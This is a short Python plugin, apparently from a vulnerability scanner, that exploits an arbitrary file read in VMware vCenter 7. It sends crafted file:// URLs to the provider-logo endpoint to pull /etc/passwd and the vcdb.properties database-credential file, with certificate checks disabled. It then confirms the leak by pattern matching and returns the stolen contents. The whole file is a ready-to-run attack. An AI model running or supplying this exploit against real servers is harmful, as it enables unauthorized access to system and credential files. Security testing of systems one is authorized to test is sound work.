#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'vmware vcenter 7 arbitrary 任意文件读取',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/2/2',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  targets = ['/ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file:///etc/passwd','/ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file:///C:/ProgramData/VMware/vCenterServer/cfg/vmware-vpx/vcdb.properties']
  url1 = url + targets[0]
  url2 = url + targets[1]
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'root:.*?:[0-9]*:[0-9]*:',res.text,re.S):
      ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
  except:
    pass
  try:
    res=requests.get(url=url2,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'org.postgresql.Driver',res.text,re.S):
      ret['huixian'] = res.text
      res.close()
      ret['url'] = url2
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret